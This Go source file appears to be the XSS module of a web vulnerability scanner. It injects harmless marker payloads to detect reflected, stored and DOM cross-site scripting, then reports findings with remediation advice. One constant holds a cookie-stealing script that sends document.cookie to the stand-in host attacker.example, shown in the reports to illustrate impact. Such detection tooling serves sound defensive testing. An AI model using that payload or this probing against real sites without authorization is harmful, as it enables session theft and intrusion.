// Package xss tests cross-site scripting: it injects marked payloads into
// discovered parameters and confirms reflected XSS when the payload comes back
// unencoded, stored XSS when a POSTed payload persists across a later GET, and
// flags DOM XSS sinks in discovered JavaScript files.
package xss

import (
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"

	"github.com/sayseven7/frameseven/internal/config"
	"github.com/sayseven7/frameseven/internal/finding"
	"github.com/sayseven7/frameseven/internal/tools/v1/recon"
)

const marker = "frx7marker"

// reflectedPayloads break out of common HTML contexts. A hit is confirmed when
// the raw payload (including its angle brackets) is reflected without encoding.
var reflectedPayloads = []string{
	"<" + marker + ">",
	"\"><" + marker + ">",
	"'><" + marker + ">",
	"javascript:" + marker,
	"<img src=x onerror=" + marker + ">",
	"<svg/onload=" + marker + ">",
}

// escalationPayload is reported once a parameter is proven reflectable, to show
// the realistic impact of the vulnerability.
const escalationPayload = "<script>document.location='http://attacker.example/?c='+document.cookie</script>"

// domSinks are JavaScript sinks that turn attacker-controlled input into script
// execution. They are reported when paired with a location-based source.
var domSinks = []string{
	"innerHTML", "document.write", "eval", "setTimeout", "location.href",
}

var domSources = []string{"location.hash", "location.search"}

type response struct {
	status int
	body   string
	dump   string
}

// Run injects XSS payloads into discovered parameters and inspects JS files.
func Run(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}

	for _, p := range surface.Params {
		u, err := url.Parse(p.Endpoint)
		if err != nil {
			continue
		}

		key := p.Name + "|" + u.Path
		if tested[key] {
			continue
		}

		tested[key] = true

		findings = append(findings, testReflected(cfg, client, p)...)
		findings = append(findings, testStored(cfg, client, p)...)
	}

	findings = append(findings, testDOM(cfg, client, surface)...)

	return findings
}

func testReflected(cfg *config.Config, client *http.Client, p recon.Param) []finding.Finding {
	var findings []finding.Finding

	for _, payload := range reflectedPayloads {
		resp := injectGet(cfg, client, p, payload)
		if resp == nil || !strings.Contains(payload, "<") {
			continue
		}

		if !strings.Contains(resp.body, payload) {
			continue
		}

		// Reject reflections that land in a non-executable context: inside a
		// textarea, title, or script string literal the markup does not run.
		if xssIsEscapedContext(resp.body, payload) {
			continue
		}

		findings = append(findings, finding.Finding{
			Title:       "Reflected XSS in parameter '" + p.Name + "'",
			Module:      "xss",
			Severity:    finding.High,
			OWASP:       "A03:2025 - Injection",
			CWE:         "CWE-79",
			CVSS:        7.2,
			Description: "A script-injection payload was reflected in the response without HTML encoding, so the parameter executes attacker-controlled markup in the victim's browser.",
			Evidence: finding.Evidence{
				Request:   resp.dump,
				Response:  trim(resp.body, 500),
				Extracted: "payload: " + payload + "\nescalation: " + escalationPayload,
			},
			NextSteps: []string{
				"Context-encode all output and validate input server-side.",
				"Apply a strict Content-Security-Policy to limit script execution.",
			},
			Confidence: 0.85,
		})

		return findings
	}

	return findings
}

// xssIsEscapedContext returns true when the payload appears in a non-executable
// context: inside a textarea, title, or an open script element, where the
// reflected markup is treated as text rather than parsed as HTML.
func xssIsEscapedContext(body, payload string) bool {
	idx := strings.Index(body, payload)
	if idx < 0 {
		return false
	}

	start := idx - 200
	if start < 0 {
		start = 0
	}

	ctx := strings.ToLower(body[start:idx])

	for _, tag := range []string{"<textarea", "<title", "<script"} {
		lastOpen := strings.LastIndex(ctx, tag)
		lastClose := strings.LastIndex(ctx, "</"+tag[1:])

		if lastOpen > lastClose {
			return true
		}
	}

	return false
}

func testStored(cfg *config.Config, client *http.Client, p recon.Param) []finding.Finding {
	payload := "<" + marker + "stored>"

	post := postForm(cfg, client, p.Endpoint, p.Name, payload)
	if post == nil || post.status >= 400 {
		return nil
	}

	view := injectGet(cfg, client, p, "")
	if view == nil || !strings.Contains(view.body, payload) {
		return nil
	}

	return []finding.Finding{{
		Title:       "Stored XSS in parameter '" + p.Name + "'",
		Module:      "xss",
		Severity:    finding.Critical,
		OWASP:       "A03:2025 - Injection",
		CWE:         "CWE-79",
		CVSS:        9.0,
		Description: "A payload submitted via POST persisted and was served back unencoded on a later request, so it executes for every visitor of the page.",
		Evidence: finding.Evidence{
			Request:   post.dump,
			Response:  trim(view.body, 500),
			Extracted: "stored payload: " + payload + "\nescalation: " + escalationPayload,
		},
		NextSteps: []string{
			"Context-encode stored content on output and validate input on write.",
			"Apply a strict Content-Security-Policy to limit script execution.",
		},
		Confidence: 0.9,
	}}
}

func testDOM(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}

	for _, endpoint := range surface.Endpoints {
		if !strings.HasSuffix(strings.ToLower(endpoint), ".js") || tested[endpoint] {
			continue
		}

		tested[endpoint] = true

		resp := get(cfg, client, endpoint)
		if resp == nil || resp.status != http.StatusOK {
			continue
		}

		sink := firstMatch(resp.body, domSinks)
		source := firstMatch(resp.body, domSources)

		if sink == "" || source == "" {
			continue
		}

		findings = append(findings, finding.Finding{
			Title:       "Potential DOM XSS sink in " + lastSegment(endpoint),
			Module:      "xss",
			Severity:    finding.Info,
			OWASP:       "A03:2025 - Injection",
			CWE:         "CWE-79",
			Description: "A discovered JavaScript file feeds a location-based source into a dangerous DOM sink, which can lead to client-side script execution.",
			Evidence: finding.Evidence{
				Request:   resp.dump,
				Extracted: "file: " + endpoint + "\nsink: " + sink + "\nsource: " + source + "\n" + sinkSnippet(resp.body, sink),
			},
			NextSteps: []string{
				"Trace whether the source can reach the sink without sanitization.",
				"Use safe DOM APIs (textContent, setAttribute) instead of raw HTML sinks.",
			},
		})
	}

	return findings
}

func firstMatch(body string, needles []string) string {
	for _, n := range needles {
		if strings.Contains(body, n) {
			return n
		}
	}

	return ""
}

func sinkSnippet(body, sink string) string {
	idx := strings.Index(body, sink)
	if idx < 0 {
		return ""
	}

	start := idx - 60
	if start < 0 {
		start = 0
	}

	end := idx + 60
	if end > len(body) {
		end = len(body)
	}

	return "snippet: " + strings.TrimSpace(body[start:end])
}

func lastSegment(endpoint string) string {
	if u, err := url.Parse(endpoint); err == nil {
		segments := strings.Split(u.Path, "/")
		for i := len(segments) - 1; i >= 0; i-- {
			if segments[i] != "" {
				return segments[i]
			}
		}
	}

	return endpoint
}

func injectGet(cfg *config.Config, client *http.Client, p recon.Param, value string) *response {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return nil
	}

	q := u.Query()
	q.Set(p.Name, value)
	u.RawQuery = q.Encode()

	return get(cfg, client, u.String())
}

func get(cfg *config.Config, client *http.Client, target string) *response {
	req, err := http.NewRequest(http.MethodGet, target, nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)

	dump, _ := httputil.DumpRequestOut(req, false)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	return &response{status: resp.StatusCode, body: string(body), dump: string(dump)}
}

func postForm(cfg *config.Config, client *http.Client, endpoint, name, value string) *response {
	form := url.Values{}
	form.Set(name, value)

	req, err := http.NewRequest(http.MethodPost, endpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	dump, _ := httputil.DumpRequestOut(req, true)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	return &response{status: resp.StatusCode, body: string(body), dump: string(dump)}
}

func trim(s string, max int) string {
	s = strings.TrimSpace(s)
	if len(s) > max {
		return s[:max]
	}

	return s
}
